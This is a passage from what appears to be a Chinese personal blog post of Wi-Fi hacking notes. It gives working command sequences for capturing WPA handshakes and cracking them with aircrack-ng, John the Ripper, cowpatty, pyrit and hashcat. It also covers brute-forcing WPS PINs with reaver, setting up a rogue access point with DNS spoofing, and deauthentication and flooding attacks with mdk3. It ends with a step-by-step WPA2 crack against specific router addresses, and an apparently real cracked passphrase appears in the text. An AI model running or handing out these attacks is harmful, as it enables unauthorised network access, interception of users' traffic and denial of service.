+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> kifi &gt; essid.txt                   </span><br><span class="line">airolib-ng db --import essid essid.txt</span><br><span class="line">airolib-ng db --stats                   </span><br><span class="line">airolib-ng db --import passwd /usr/share/wordlists/rockyou.txt</span><br><span class="line">    自动剔除不合格的WPA字典             </span><br><span class="line">airolib-ng db --batch                   </span><br><span class="line">    生成PMK</span><br></pre></td></tr></table></figure>
+<p>上面这个步骤实在太久就直接结束掉了<br><code>aircrack-ng -r db wpa.cap</code></p>
+<p><img src="https://i.imgur.com/peOrNFX.jpg" alt=""></p>
+<h3 id="JTR破解密码"><a href="#JTR破解密码" class="headerlink" title="JTR破解密码"></a>JTR破解密码</h3><p>John the ripper<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;快速的密码破解软件<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;支持基于规则扩展密码字典<br>很多人系统用书记号码做无线密码<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取号段并利用JTR规则增加最后几位的数字<br>配置文件/etc/john/john.conf<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[list.Rules:Wordlist]<br>    <code>$[0-9]$[0-9]$[0-9]</code> </p>
+<p>测试效果<br>    <code>john --wordlist=passwrod.list --rules --stdout | grep -i Password123</code></p>
+<p>破解调用<br>    <code>john --wroldlist=pass.list --rules --stdout | aricrack-ng -e kifi -w - wap.cap</code></p>
+<p><img src="https://i.imgur.com/jCaUNky.jpg" alt=""></p>
+<p>北京联通手机号密码破解<br><code>john --wroldlist=yd.txt --rules --stdout | aricrack-ng -e kifi -w - wap02.cap</code></p>
+<h3 id="COWPATTY破解密码"><a href="#COWPATTY破解密码" class="headerlink" title="COWPATTY破解密码"></a>COWPATTY破解密码</h3><p>WPA密码通用破解工具<br>使用密码字典<br>    <code>cowpatty -r wpa.cap -f password.lst -s kifi</code><br>使用彩虹表(PMK)<br>    <code>genpmk -f password.lst -d pmkhash -s kifi   
+    cowpatty -r wpa.cap -d pmkhash -s kifi</code></p>
+<p>字典和彩虹表破解的效率不一样</p>
+<h3 id="PYRIT破解密码"><a href="#PYRIT破解密码" class="headerlink" title="PYRIT破解密码"></a>PYRIT破解密码</h3><p>与<code>airolib</code>、<code>cowpatty</code>相同，支持基于预计算的PMK提高破解速度<br>独有的优势<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除CPU之外pyrit可以运行GPU的强大运算能力加速生成PMK<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本身支持抓包获取四步握手过程，无需用Airdum抓包<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也支持传统的读取airodump抓包获取四步握手的方式      </p>
+<p>只抓取WAP四次握手过程包<br>    <code>pyrit -r wlan2mon -o wpapyrit.cap stripLive</code><br>    <code>pyrit -r wpapyrit.cap analyze</code>                       </p>
+<p>从airodump抓包导入并筛选<br>    <code>pyrit -r wpa.cap -o wpapyrit.cap strip</code>           </p>
+<p>PYRIT破解密码                                                                 </p>
+<p>使用密码字典直接破解<br>    <code>pyrit -r wpaprit.cap -i password.lst -b &lt;AP MAC&gt; attack passthrough</code>      </p>
+<p>数据库模式破解<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看默认数据库状态：<code>pyrit eval</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;导入密码字典：<code>pyrit -i password.lst import password</code> (剔除了不合规的密码）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;制定ESSID：<code>pyrit -e kifi create essid</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;计算PMK：<code>pyrit batch</code>  (发挥GPU计算能力）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;破解密码：<code>pyrit -r wpapyrit.cap -b &lt;AP MAC&gt; attack_db</code><br>    <code>pyrit -r wpaprit.cap -i /usr/share/john/password.lst -b ec:26:ca:dc:29:b6 attack passthrough</code></p>
+<h3 id="用hashcat破解WPA-PSK密码"><a href="#用hashcat破解WPA-PSK密码" class="headerlink" title="用hashcat破解WPA/PSK密码"></a>用hashcat破解WPA/PSK密码</h3><p>用aircrack-ng把cap转换成hccap</p>
+<p><code>aircrack-ng &lt;out.cap&gt; -J &lt;out.hccap&gt;</code></p>
+<p><code>hashcat -m 2500 testap.hccap pass.txt</code></p>
+<p>不过根据之前遇到的问题如果转换后hashcat新版本无法支持可以通过网址转换<br><a href="https://hashcat.net/cap2hccapx/" target="_blank" rel="external">https://hashcat.net/cap2hccapx/</a></p>
+<p>用hashcat-utils转换cap包<br>github：<a href="https://github.com/hashcat/hashcat-utils" target="_blank" rel="external">https://github.com/hashcat/hashcat-utils</a></p>
+<h2 id="WPS-WIRELESS-PROTECTED-SETUP"><a href="#WPS-WIRELESS-PROTECTED-SETUP" class="headerlink" title="WPS (WIRELESS PROTECTED SETUP)"></a>WPS (WIRELESS PROTECTED SETUP)</h2><p>WPS是WiFi联盟2006年开放的一项技术<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过PIN码来简化无线接入的操作，无需记住PSK<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;路由器和网卡各按一个按钮就能接入无线<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PIN码是分为前后各4位的2段共8位数字<br>安全漏洞<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2011年被发现安全涉及漏洞<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接入发起方可以根据路由器的返回信息判断前4位是否正确<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而PIN码的后4位只有1000中定义的组合(最后一位是checksum)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以全部穷举破解只需要11000次尝试<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PSK: 218,340,105,584,896<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;标准本身没有设计锁定机制，目前多个厂商已实现锁定机制  </p>
+<p>包括Linksys在内的很多厂家的无线路由器无法关闭WPS功能<br>即使在WEB节目中有关闭WPS，配置也不会生效<br>攻击难度相对较低，防御却十分困难<br>一般可在4-10小时爆破密码<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PSK<br>用计算器直接算出PIN<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C83A35<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00B00C      </p>
+<p>启动侦听模式后，发现支持WPS的AP<br>    <code>wash -C -i wlan0mon</code><br>    <code>airodump-ng wlan0mon --wps</code>               </p>
+<h3 id="爆破PIN码"><a href="#爆破PIN码" class="headerlink" title="爆破PIN码"></a>爆破PIN码</h3><p><code>reaver -i wlan0mon -b &lt;AP mac&gt; -vv</code><br><code>reaver -i wlan0mon -b 14:75:90:21:4F:56 -vv -c 11</code>   </p>
+<p>秒破PIN码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0mon down </span><br><span class="line">ifconfig wlan0mon up                                    </span><br><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv -K 1  </span><br><span class="line">reaver -i wlan0mon -b 14:75:90:21:4F:56 -vv -c 11 </span><br><span class="line">    pixiewps                                  </span><br><span class="line">    只适用于固定厂商的芯片，成功率很低        </span><br><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv -p 88888888</span><br></pre></td></tr></table></figure>
+<p>综合自动化无线密码破解工具wifite   </p>
+<h2 id="伪造无线网络"><a href="#伪造无线网络" class="headerlink" title="伪造无线网络"></a>伪造无线网络</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng -c 11 --essid kifi-free wlan2mon    //伪造wifi-free无线网络</span><br><span class="line">apt-get install bridge-Utils                          //安装网桥</span><br><span class="line">brctl addbr bridge                                    </span><br><span class="line">brctl addif Wifi-Bridge eth0                          </span><br><span class="line">brctl addif Wifi-Bridge at0                           </span><br><span class="line">ifconfig eth0 0.0.0.0 up                              </span><br><span class="line">ifconfig at0 0.0.0.0 up                               </span><br><span class="line">ifconfig bridge 192.168.1.10 up                       </span><br><span class="line">route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">dnspoof -i bridge <span class="_">-f</span> dnsspoof.hosts   </span><br><span class="line">    /usr/share/dnsiff/dnsspoof.hosts  </span><br><span class="line">apachet2ctl start</span><br></pre></td></tr></table></figure>
+<h3 id="WiFi-Pumpkin"><a href="#WiFi-Pumpkin" class="headerlink" title="WiFi-Pumpkin"></a>WiFi-Pumpkin</h3><p>WiFi-Pumpkin图形化<br><img src="https://i.imgur.com/gZqMOhr.png" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/P0cL4bs/WiFi-Pumpkin.git</span><br><span class="line">apt-get install isc-dhcp-server</span><br><span class="line"><span class="built_in">cd</span> WiFi-Pumpkin</span><br><span class="line">./installer.sh --install</span><br></pre></td></tr></table></figure>
+<h2 id="其它工具"><a href="#其它工具" class="headerlink" title="其它工具"></a>其它工具</h2><h3 id="AIRDECAP-NG"><a href="#AIRDECAP-NG" class="headerlink" title="AIRDECAP-NG"></a>AIRDECAP-NG</h3><p>去除802.11头<br>    <code>airdecap-ng -b &lt;AP MAC&gt; 1.pcap</code><br>解密WEP加密数据<br>    <code>airdecap-ng -w &lt;WEP key&gt;-b &lt;AP MAC&gt; 1.pcap</code><br>    必须有与AP建立关联关系<br>解密WPA加密数据<br>    <code>airdecap-ng -e kifi -p &lt;PSK&gt; -b &lt;AP MAC&gt; 1.pcap</code><br>    抓包文件中必须包含4步握手信息，否则无解<br><code>airodump-ng wlan2mon --bssid 14:75:90:21:4F:56 -c 6 -w TP-01</code><br><code>airdecap-ng -e TP-LINK_4F56 -b 14:75:90:21:4F:56 -p wanshuyuan123456shangdi tp-01.cap</code></p>
+<h3 id="AIRSERV-NG"><a href="#AIRSERV-NG" class="headerlink" title="AIRSERV-NG"></a>AIRSERV-NG</h3><p>通过网络提供无线网卡服务器<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;某些网卡不支持客户点/服务器模式<br>启动无线侦听<br>服务器端<br>    <code>airserv-ng -p 3333 -d wlan2mon</code><br>    <code>netstat -pantu | grep 3333</code><br>客户端<br>    <code>airodump-ng 192.168.1.1:3333</code><br>某些防火墙会影响C/S间的通信   </p>
+<h3 id="AIRTUN-NG"><a href="#AIRTUN-NG" class="headerlink" title="AIRTUN-NG"></a>AIRTUN-NG</h3><p>无线入侵检测wIDS<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;无线密码和BSSID<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;需要获取握手信息<br>中继和重放<br>    Repeate/Replay             </p>
+<p><code>airtun-ng -a 14:75:90:21:4F:56 -p wanshuyuan123456shangdi -e TP-LINK_4F56 wlan2mon</code><br><code>ifcongif at0 up</code></p>
+<blockquote>
+<p>Repeate<br>    WDS/Bridge<br>    扩展无线侦听的距离<br>    要求两块网卡都置入monitor模式<br>    airtun-ng -a <ap mac=""> –repeat –bssid <ap mac=""> -i wlan0mon wlan2mon<br>    wlan0mon: 收包的网卡<br>    wlan2mon: 发包的网卡<br>    -a: 发包的源地址<br>    –bssid: 过滤只发指定源地址的包(可选)      </ap></ap></p>
+</blockquote>
+<p><code>airtun-ng -a 14:75:90:21:4F:56 --repeat --bssid 14:75:90:21:4F:56 -i wlan0mon wlan2mon</code><br>第一个侦听网卡灵敏度大，第二是发包网卡传输功率大<br>可以做出一个梅莓派然后再加个充电宝,其次是再加个手机卡上网远程操作实现起来可能会有点难</p>
+<h2 id="kismet"><a href="#kismet" class="headerlink" title="kismet"></a>kismet</h2><p>测试周围无线信号<br><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/51.html" target="_blank" rel="external">https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/51.html</a><br>和GISKismet工具配合使用</p>
+<pre><code class="bash">kismet*.nettxt                              
+kismet*.pcapdump                            
+
+gpsd -n -N -D4/dev/ttyUSBO                      
+giskismet -x Kismet-*.netxml                    
+giskismet -q <span class="string">"select * from wireless"</span> -o gps.kml
+</code></pre>
+<h2 id="实战破解WAP2密码"><a href="#实战破解WAP2密码" class="headerlink" title="实战破解WAP2密码"></a>实战破解WAP2密码</h2><p>条件一：<br>实验场景：虚拟机Kali2.0<br>需要硬件设备：无线网卡MERCURV<br><a href="https://detail.tmall.com/item.htm?spm=a230r.1.14.20.h3E0Cp&amp;id=539124641086&amp;ns=1&amp;abbucket=14" target="_blank" rel="external">https://detail.tmall.com/item.htm?spm=a230r.1.14.20.h3E0Cp&amp;id=539124641086&amp;ns=1&amp;abbucket=14</a></p>
+<p>条件二：<br>Kali安装到本地硬件，无线无线网卡。</p>
+<p>插入无线网卡，Vmware加载外部硬件设备<br><img src="https://i.imgur.com/pm0JC8Z.jpg" alt=""></p>
+<p><code>airmon-ng</code><br>列出了支持监控模式的无线网卡。如果没有任何输出，表示无线网卡不支持监控模式。<br><img src="https://i.imgur.com/ag3yLIe.jpg" alt=""></p>
+<p>开启无线网卡的监控模式<br><code>airmon-ng start wlan0</code><br>再通过ifconfig查看是否有开启成功，如果网卡中有wlan0mon表示开启成功<br><img src="https://i.imgur.com/TOW7DI6.jpg" alt=""></p>
+<p>查看wifi网络（红色框表示我们要破解的无线）<br><code>airodump-ng wlan0mon</code><br><img src="https://i.imgur.com/8CVhQev.jpg" alt=""></p>
+<p>上面列出了周围的wifi和它们的详细信息，包括信号强度、加密类型、频道等。要记住要破解wifi的频道号和BSSID。<br>按Ctrl + C结束</p>
+<p>抓取握手包<br><code>airodump-ng -c 6 --bssid 64:A6:51:DF:77:84 -w crack wlan0mon</code><br>-c指定频道号<br>–bssid指定路由器bssid<br>-w指定抓取的数据包保存位置<br><img src="https://i.imgur.com/PguA0rf.jpg" alt=""></p>
+<p>使用网卡的监听模式抓取周围的无线网络数据包。其中，对我们最重要的数据包是：包含密码的包 ，也叫握手包。当有新用户或断开用户自动连接wifi时，会发送握手包，新开一个终端窗口，不要断开当前抓包窗口</p>
+<p>强制连接到wifi的设备重新连接路由器<br><code>aireplay-ng -0 2 -a 64:A6:51:DF:77:84 -c 98:01:A7:92:E8:51 wlan0mon</code></p>
+<p>-0指定发送反认证包的个数<br>-a指定无线路由器BSSID<br>-c指定强制断开的设备<br><img src="https://i.imgur.com/LbnfkiT.jpg" alt=""></p>
+<p>（会影响当前网络无线会断开一会）</p>
+<p>果成功会显示<br><img src="https://i.imgur.com/RNsEk9P.jpg" alt=""></p>
+<p>结束抓包:Ctrl+C</p>
+<p>这里使用Kali默认自带的密码字典：<br>解压:<br><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code><br>开始破解密码<br><code>aircrack-ng -a2 -b 64:A6:51:DF:77:84 -w /usr/share/wordlists/rockyou.txt ~/*.cap</code></p>
+<p>-a2代表WPA的握手包<br>-b指定要破解的wifi BSSID。<br>-w指定字典文件<br><img src="https://i.imgur.com/CqPkKpo.jpg" alt=""></p>
+<p>关闭监听网卡：<br><code>airmon-ng stop wlan0mon</code><br>连接无线</p>
+<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>wesside-ng   自动破解WEP网络</p>
+<p>Elcomsoft Wireless Security Auditor  图形化无线破解工具</p>
+<p>Win7 MAC Address Changer   把自己的MAC改成目标客户端的MAC</p>
+<p>无线网无DHCP  通过Wireshark抓包分析出地址</p>
+<p>伪造大量基于软件的恶意AP<br><code>mdk3 wlan0mon -b -n 无线名字 -c 信道 -s 200</code></p>
+<p><code>mdk3 wlan0mon b -g -c 1</code></p>
+<p>验证攻击，让别人在输入密码的时候无法验证<br><code>mdk3 网卡 a -a APMac</code></p>
+<p>取消验证攻击，就是断网<br><code>mdk3 网卡 d -c 信道</code><br><code>aireplay-ng -0 数量 -a APMac -c 客户端MAC 网卡</code></p>
+<p>DHCP洪水攻击<br><code>dhcpx -v -i wlan0mon -D 192.168.1.1 -t 100</code></p>
+<p>路由器卫士限速</p>
+<p>合并报文等:<br><code>ivstools --merge 1.ivs 2.ivs z.ivs</code><br><code>ivstools --convert wep.cap z.ivs</code></p>
+<p>ettercap ARP 欺骗嗅探密码</p>
+<p>安卓内网渗透：csploit、zANTI、幻影Pin</p>
+<p>Fern Wifi Cracker 一款图形化wifi破解工具通过Python写的</p>
+<p>wifite 基于aircrack-ng</p>
+<p>arpspoof<br><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/58.html" target="_blank" rel="external">https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/58.html</a></p>
+<p>Ghost Phisher 伪造AP 钓鱼攻击</p>
+<p>Gqrx无线电接收器</p>
+<p>hostapd-WPE<br><a href="https://bbs.pediy.com/thread-216681.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-216681.htm</a></p>
+<p>Pyrit 跑wpa2密码可以使用gpu cpu<br><a href="http://xiao106347.blog.163.com/blog/static/215992078201311851838/" target="_blank" rel="external">http://xiao106347.blog.163.com/blog/static/215992078201311851838/</a></p>
+<p>Fluxion<br><a href="http://hackerwing.com/2017/08/29/WIFI%E7%A0%B4%E8%A7%A3%E7%A5%9E%E5%99%A8%E2%80%94%E2%80%94Fluxion/" target="_blank" rel="external">http://hackerwing.com/2017/08/29/WIFI%E7%A0%B4%E8%A7%A3%E7%A5%9E%E5%99%A8%E2%80%94%E2%80%94Fluxion/</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/22/实地渗透失败/" rel="next" title="实地渗透失败">
+                <i class="fa fa-chevron-left"></i> 实地渗透失败
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/10/31/10月资讯汇总/" rel="prev" title="10月资讯汇总">
+                10月资讯汇总 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2017/10/26/Wifi安全笔记/"
+           data-title="Wifi安全笔记" data-url="http://yoursite.com/2017/10/26/Wifi安全笔记/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#无线技术特点"><span class="nav-number">1.</span> <span class="nav-text">无线技术特点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#802-11标准"><span class="nav-number">1.1.</span> <span class="nav-text">802.11标准</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IEEE-802-11标准"><span class="nav-number">1.2.</span> <span class="nav-text">IEEE 802.11标准</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#日常使用标准"><span class="nav-number">1.2.1.</span> <span class="nav-text">日常使用标准</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MONITOR-MODR"><span class="nav-number">1.3.</span> <span class="nav-text">MONITOR MODR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无线技术概念"><span class="nav-number">1.4.</span> <span class="nav-text">无线技术概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无线网卡的选择"><span class="nav-number">1.5.</span> <span class="nav-text">无线网卡的选择</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#查看无线网卡"><span class="nav-number">1.5.1.</span> <span class="nav-text">查看无线网卡</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#信道频道"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">信道频道</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#扫描附近AP"><span class="nav-number">1.5.2.</span> <span class="nav-text">扫描附近AP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#添加删除帧听端口"><span class="nav-number">1.5.3.</span> <span class="nav-text">添加删除帧听端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WAP安全系统"><span class="nav-number">1.5.4.</span> <span class="nav-text">WAP安全系统</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WPA加密两种安全类型"><span class="nav-number">1.5.4.1.</span> <span class="nav-text">WPA加密两种安全类型</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本操作步骤"><span class="nav-number">2.</span> <span class="nav-text">基本操作步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AIREPLAY-NG"><span class="nav-number">2.1.</span> <span class="nav-text">AIREPLAY-NG</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AIREPLAY-NG排错"><span class="nav-number">2.2.</span> <span class="nav-text">AIREPLAY-NG排错</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEP共享密钥破解"><span class="nav-number">3.</span> <span class="nav-text">WEP共享密钥破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#步骤"><span class="nav-number">3.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wep破解操作步骤"><span class="nav-number">3.2.</span> <span class="nav-text">wep破解操作步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WPA-PSK攻击"><span class="nav-number">4.</span> <span class="nav-text">WPA PSK攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PSK破解过程"><span class="nav-number">4.1.</span> <span class="nav-text">PSK破解过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#几种本地破解密码方法"><span class="nav-number">5.</span> <span class="nav-text">几种本地破解密码方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AIROLIB破解密码"><span class="nav-number">5.1.</span> <span class="nav-text">AIROLIB破解密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JTR破解密码"><span class="nav-number">5.2.</span> <span class="nav-text">JTR破解密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#COWPATTY破解密码"><span class="nav-number">5.3.</span> <span class="nav-text">COWPATTY破解密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PYRIT破解密码"><span class="nav-number">5.4.</span> <span class="nav-text">PYRIT破解密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用hashcat破解WPA-PSK密码"><span class="nav-number">5.5.</span> <span class="nav-text">用hashcat破解WPA/PSK密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WPS-WIRELESS-PROTECTED-SETUP"><span class="nav-number">6.</span> <span class="nav-text">WPS (WIRELESS PROTECTED SETUP)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破PIN码"><span class="nav-number">6.1.</span> <span class="nav-text">爆破PIN码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#伪造无线网络"><span class="nav-number">7.</span> <span class="nav-text">伪造无线网络</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WiFi-Pumpkin"><span class="nav-number">7.1.</span> <span class="nav-text">WiFi-Pumpkin</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其它工具"><span class="nav-number">8.</span> <span class="nav-text">其它工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AIRDECAP-NG"><span class="nav-number">8.1.</span> <span class="nav-text">AIRDECAP-NG</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AIRSERV-NG"><span class="nav-number">8.2.</span> <span class="nav-text">AIRSERV-NG</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AIRTUN-NG"><span class="nav-number">8.3.</span> <span class="nav-text">AIRTUN-NG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kismet"><span class="nav-number">9.</span> <span class="nav-text">kismet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实战破解WAP2密码"><span class="nav-number">10.</span> <span class="nav-text">实战破解WAP2密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Other"><span class="nav-number">11.</span> <span class="nav-text">Other</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
